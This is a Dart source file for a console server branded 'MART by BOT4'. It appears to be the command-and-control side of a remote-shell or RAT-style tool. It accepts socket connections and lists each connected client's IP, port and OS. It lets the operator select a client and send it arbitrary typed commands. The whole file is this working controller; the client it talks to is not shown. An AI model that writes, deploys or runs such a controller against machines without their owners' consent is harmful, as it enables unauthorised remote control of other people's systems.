import 'dart:io';
import 'package:server/models/client.dart';
import 'package:server/server.dart';

List<Client> clients = [];
Client clientSelected;
String STATE = "MENU";
String menu = """
                __       
          _____/* |     ____    
                `-,`-._,'---'
                  `, `)--` 
                  __)/ 
                    /|`

        MART

        by BOT4

        Commmands:
        /list - List the Clients
        /set id - Connect the client Id
        /menu - back to menu in command 
  """;

main() {
  print(menu);

  Server("127.0.0.1", 6662).listen((Socket socketClient) {
    Client newClient = new Client(socketClient);
    newClient.listener((String message) {
      print(message);
    });
    clients.add(newClient);
    print(
        "New Client \x1B[32m${newClient.ip}:${newClient.port}\x1B[32m Connected");
  });

  stdin.listen((data) {
    String dataString = new String.fromCharCodes(data).trim();
    try {
      optionsMenu(dataString);
    } catch (error) {
      print("Error in input: ${error.toString()}");
    }
  });
}

optionsMenu(data) {
  switch (STATE) {
    case "MENU":
      if (data.contains("/list")) {
        print("Id  |  Host  |  Os");
        clients.forEach((client) {
          int indexClient = clients.indexOf(client);
          print(
              "\x1B[32m${indexClient}\x1B[32m  |  ${client.ip}:${client.port}  |  ${client.os}");
        });
      } else if (data.contains("/set")) {
        int indexSet = int.parse(data.split(" ")[1]);
        clientSelected = clients[indexSet];
        print("Command set to client id ${indexSet}, type /menu to back");
        STATE = "COMMAND";
      }
      break;
    case "COMMAND":
      if (data.contains("/menu")) {
        print(menu);
        STATE = "MENU";
      } else {
        clientSelected.sendMessage(data + '\n\r');
      }
      break;
  }
}
